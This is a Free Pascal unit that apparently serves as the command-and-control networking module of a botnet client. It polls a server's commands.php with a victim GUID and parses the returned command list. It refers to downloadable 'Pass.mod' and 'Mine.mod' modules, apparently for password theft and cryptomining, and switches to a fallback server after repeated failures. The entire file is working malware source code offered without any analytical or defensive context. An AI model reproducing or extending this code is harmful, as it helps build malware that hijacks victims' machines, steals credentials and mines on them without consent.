unit NetModule;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Interfaces, IdHTTP, INIFiles, Tools;

type

  { TNet }

  TNet = class(TDataModule)
    HTTPAgent: TIdHTTP;
    procedure DataModuleCreate(Sender: TObject);
    procedure DataModuleDestroy(Sender: TObject);
  private

  public
    Commands:  TMemINIFile;
    CommandCount: Integer;

    procedure GetCommands;
    function GetCommandID(Index: LongInt): String;
    procedure SwitchToSec;
  end;

const
  CommandsPHP = '/commands.php';
  ResultsPHP  = '/result.php';
  PassModule  = '/modules/Pass.mod';
  MineConfig  = '/modules/config.json';
  MineModule  = '/modules/Mine.mod';
  MineModule64= '/modules/Mine64.mod';

var
  Net: TNet;
  NExCount: Byte;

implementation

{$R *.lfm}

{ TNet }

function TNet.GetCommandID(Index: LongInt): String;
var
  J: LongInt;
  S: String;
Begin
  S:=Commands.ReadString('General', 'Commands', '');
  For J:=1 to Index-1 do Delete(S, 1, Pos(',', S));
  J:=Pos(',', S);
  if J>0 then Result:=LeftStr(S, J - 1)
  else Result:=S;
end;

procedure TNet.SwitchToSec;
var
  L: String;
Begin
  NExCount:=0;
  try
    L:=HTTPAgent.Get(Settings.ReadString('General', 'SecMapping', ''));
    Writeln('Secondary Mapping --> "',L,'"');
    if Pos('http', L)>0 then Begin
      L:=StringReplace(L, 'https://', 'http://', [rfIgnoreCase]);
      if RightStr(L, 1)='/' then Delete(L, Length(L), 1);
      //Set the new Server location
      Server:=L;
    end;
  except
  end;
end;

procedure TNet.GetCommands;
var
  MS: TMemoryStream;
  S: TStringList;
  PExCount: Byte;
Begin
  PExCount:=NExCount;
  MS:=TMemoryStream.Create;
  S:=TStringList.Create;
  try
    try
      HTTPAgent.Get(Server+CommandsPHP+'?GUID='+ID, MS);
    except on E: Exception do Begin
      NExCount += 1;
      Writeln('[',NExCount,'] Server unreachable');
      if NExCount>=5 then SwitchToSec;
    end;
    end;
    if PExCount=NExCount then NExCount:=0; //Consecutive exceptions only
    MS.Position:=0;
    S.LoadFromStream(MS);
    Commands.SetStrings(S);
  finally
    MS.Free;
    S.Free;
  end;
  CommandCount:=Commands.ReadInteger('General', 'CommandCount', 0);
end;

procedure TNet.DataModuleCreate(Sender: TObject);
begin
  NExCount:=0;
  Commands:=TMemINIFile.Create('');
  if UsingProxy then Begin
    HTTPAgent.ProxyParams.ProxyServer:=ProxyIP;
    HTTPAgent.ProxyParams.ProxyPort:=ProxyPort;
  end;
end;

procedure TNet.DataModuleDestroy(Sender: TObject);
begin
  Commands.Free;
end;

end.

